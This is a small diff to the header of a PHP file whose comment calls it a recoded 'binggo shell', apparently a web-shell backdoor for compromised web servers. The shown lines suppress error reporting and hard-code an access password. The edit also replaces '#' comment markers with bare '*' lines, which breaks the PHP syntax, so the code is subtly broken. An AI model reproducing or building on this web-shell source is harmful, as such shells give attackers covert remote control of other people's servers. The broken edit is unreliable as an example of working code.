@@ -1,8 +1,8 @@
 <?php
 
-# Author: Flux10n
-# Type: php
-# The binggo shell I recoded.
+* Author: Flux10n
+* Github: https://github.com/flux10n
+* The binggo shell I recoded.
 
 error_reporting(0);
 $password='oit';//Your pass
